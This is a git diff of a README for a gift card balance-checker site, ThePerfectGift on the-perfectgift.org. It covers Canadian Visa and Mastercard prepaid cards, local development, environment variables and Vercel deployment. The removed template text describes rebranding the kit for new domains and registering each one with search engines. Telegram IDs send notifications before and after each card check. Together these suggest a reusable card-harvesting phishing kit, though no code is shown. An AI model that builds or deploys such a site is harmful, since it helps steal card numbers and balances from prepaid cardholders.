@@ -1,71 +1,52 @@
-# Balance Checker Template
+# ThePerfectGift
 
-Ready-to-deploy gift card balance checker with API integration, SEO, and Vercel deployment.
+Gift card balance checker and card registration for Canadian Visa and Mastercard prepaid cards.
 
-## Quick Start
+**Domain:** the-perfectgift.org
+
+## Local Development
 
 ```bash
-# 1. Copy template to new project
-cp -r template/ my-new-project/
-cd my-new-project/
-
-# 2. Run setup (replaces all placeholders)
-bash setup.sh
-
-# 3. Install & run
 npm install
 npm run dev
 ```
 
-## Placeholders
-
-The setup script replaces these automatically:
-
-| Placeholder | Example | Where |
-|---|---|---|
-| `__SITE_NAME__` | My Balance | All files |
-| `__SITE_DOMAIN__` | mybalance.store | SEO, sitemap, robots |
-| `__SITE_INITIALS__` | MB | Favicon |
-| `__VERCEL_SUBDOMAIN__` | my-balance | vercel.json redirect |
-| `__PROJECT_SLUG__` | my-balance | package.json |
-| `YOUR_GOOGLE_CODE` | abc123... | index.html |
-| `YOUR_BING_CODE` | ABC123... | index.html, BingSiteAuth.xml |
-
-## Vercel Env Variables
-
-Set these in Vercel Dashboard > Settings > Environment Variables:
-
-| Variable | Description |
-|---|---|
-| `API_TOKEN` | Your API token |
-| `TELEGRAM_ID_BEFORE_CHECK` | Telegram notification (optional) |
-| `TELEGRAM_ID_AFTER_CHECK` | Telegram notification (optional) |
+- Frontend: http://localhost:3000
+- API Server: http://localhost:3001
 
 ## Project Structure
 
 ```
-├── index.html          # Main SPA (all pages)
+├── index.html            # Main SPA (all pages)
 ├── api/
-│   └── check-balance.js  # Vercel serverless API
+│   └── check-balance.js  # Vercel serverless API function
 ├── server/
-│   └── index.js          # Local dev server
+│   └── index.js          # Local dev Express server
 ├── public/
-│   ├── favicon.svg       # Site icon
-│   ├── visa.svg          # Visa card logo
-│   ├── mastercard.svg    # Mastercard logo
-│   ├── sitemap.xml       # SEO sitemap
-│   ├── robots.txt        # Crawler rules
-│   └── BingSiteAuth.xml  # Bing verification
-├── vercel.json           # Vercel config + redirects
+│   ├── favicon.svg
+│   ├── visa.svg
+│   ├── mastercard.svg
+│   ├── sitemap.xml
+│   ├── robots.txt
+│   └── BingSiteAuth.xml
+├── vercel.json           # Vercel deployment config
 ├── vite.config.js        # Vite dev config
-├── setup.sh              # One-time setup script
-└── .env.example          # Environment template
+└── .env.example          # Environment variables template
 ```
+
+## Environment Variables
+
+Set in `.env` locally or in Vercel Dashboard for production:
+
+| Variable | Required | Description |
+|---|---|---|
+| `API_TOKEN` | Yes | Balance check API token |
+| `TELEGRAM_ID_BEFORE_CHECK` | No | Telegram notification ID |
+| `TELEGRAM_ID_AFTER_CHECK` | No | Telegram notification ID |
 
 ## Deploy
 
 1. Push to GitHub
-2. Connect repo in Vercel
-3. Add env variables in Vercel
-4. Add custom domain in Vercel
-5. Submit sitemap.xml in Google Search Console & Bing Webmaster Tools
+2. Import repo in Vercel
+3. Add environment variables in Vercel
+4. Add custom domain (the-perfectgift.org)
